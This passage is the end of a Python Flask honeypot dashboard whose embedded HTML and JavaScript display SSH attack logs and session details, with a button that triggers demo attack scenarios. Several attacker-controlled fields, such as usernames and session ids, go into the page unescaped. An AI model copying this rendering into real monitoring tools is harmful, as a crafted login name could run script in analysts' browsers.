          <tr class="hover:bg-slate-800/40 transition">
            <td class="py-2 px-3 text-slate-400 whitespace-nowrap">${ts}</td>
            <td class="py-2 px-3 whitespace-nowrap">${statusBadge}</td>
            <td class="py-2 px-3 text-cyan-400 whitespace-nowrap">${ip}:${port}</td>
            <td class="py-2 px-3 text-emerald-400 whitespace-nowrap font-bold">${user}</td>
            <td class="py-2 px-3 max-w-xs truncate" title="${cmd}">
              ${cmd ? `<span class="text-amber-300 font-bold">$ ${escapeHtml(cmd)}</span>` : `<span class="text-slate-500 italic">No command</span>`}
              ${out ? `<div class="text-[10px] text-slate-400 truncate">&rarr; ${escapeHtml(out.substring(0, 60))}</div>` : ''}
            </td>
            <td class="py-2 px-3">${mitreTags}</td>
            <td class="py-2 px-3 whitespace-nowrap">${alertBadge}</td>
            <td class="py-2 px-3 text-right whitespace-nowrap">
              <button onclick="inspectSession('${sid}')" class="text-cyan-400 hover:text-cyan-300 underline text-[10px]">Xem phiên</button>
            </td>
          </tr>
        `;
      }).join('');
    }

    function escapeHtml(str) {
      return (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    }

    // Kích hoạt tấn công thực tế
    async function triggerLiveAttack() {
      const sc = document.getElementById('scenarioSelect').value;
      const btn = document.getElementById('btnAttack');
      btn.disabled = true;
      btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Đang tấn công...`;

      try {
        const res = await fetch('/api/trigger_attack', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ scenario: sc })
        });
        const data = await res.json();
        setTimeout(() => {
          fetchEvents();
          fetchStats();
        }, 1200);
      } catch (e) {
        alert('Lỗi: ' + e);
      } finally {
        setTimeout(() => {
          btn.disabled = false;
          btn.innerHTML = `<i class="fa-solid fa-play"></i> BẮN TẤN CÔNG THỰC TẾ`;
        }, 2000);
      }
    }

    // Nạp dataset 5k
    async function load5kDataset() {
      if (!confirm('Bạn có muốn nạp toàn bộ 5.145 log sự kiện thật từ Dataset Train vào Dashboard?')) return;
      try {
        const res = await fetch('/api/load_5k_dataset', { method: 'POST' });
        const data = await res.json();
        alert(data.message);
        fetchEvents();
        fetchStats();
      } catch (e) {
        alert('Lỗi: ' + e);
      }
    }

    // Xóa sạch màn hình
    async function clearDashboard() {
      if (!confirm('Xóa sạch hiển thị log trên Dashboard?')) return;
      await fetch('/api/clear_dashboard', { method: 'POST' });
      fetchEvents();
      fetchStats();
    }

    // Xem chi tiết phiên
    async function inspectSession(sessionId) {
      if (!sessionId) return;
      const res = await fetch(`/api/session/${sessionId}`);
      const data = await res.json();
      document.getElementById('modalSessionTitle').innerText = 'Session: ' + sessionId + ' (' + data.count + ' events)';
      
      const modalBody = document.getElementById('modalBody');
      modalBody.innerHTML = data.events.map((e, idx) => `
        <div class="p-3 bg-slate-900 border border-slate-800 rounded-lg">
          <div class="flex justify-between text-slate-400 mb-1 text-[10px]">
            <span>#${idx + 1} - ${e.timestamp}</span>
            <span class="text-cyan-400 font-bold">${e.event_status}</span>
          </div>
          <div class="text-emerald-400">User: <b>${e.username || '-'}</b> | IP: ${e.source_ip}:${e.source_port}</div>
          ${e.command ? `<div class="text-amber-300 font-bold mt-1">$ ${escapeHtml(e.command)}</div>` : ''}
          ${e.command_output ? `<pre class="mt-1 p-2 bg-slate-950 text-slate-300 rounded text-[10px] overflow-x-auto whitespace-pre-wrap">${escapeHtml(e.command_output)}</pre>` : ''}
        </div>
      `).join('');

      document.getElementById('sessionModal').classList.remove('hidden');
    }

    function closeModal() {
      document.getElementById('sessionModal').classList.add('hidden');
    }

    // Polling định kỳ mỗi 1.5 giây
    window.onload = () => {
      initChart();
      loadEventsFromDisk();
      fetchEvents();
      fetchStats();
      setInterval(() => {
        fetchEvents();
        fetchStats();
      }, 1500);
    };
  </script>
</body>
</html>
"""

if __name__ == "__main__":
    load_events_from_disk()
    port = 8080
    print("=" * 75)
    print("🚀 [SOC DASHBOARD] KHỞI ĐỘNG BẢNG ĐIỀU KHIỂN REALTIME HONEYPOT...")
    print(f"🌐 Truy cập ngay tại trình duyệt: http://localhost:{port}")
    print(f"📡 Đồng bộ thời gian thực từ Honeypot VM: {VM_HOST}:22")
    print(f"⚡ Tích hợp Live Demo Attack Trigger & Nạp 5.145 Dataset")
    print("=" * 75)
    app.run(host="0.0.0.0", port=port, debug=False)
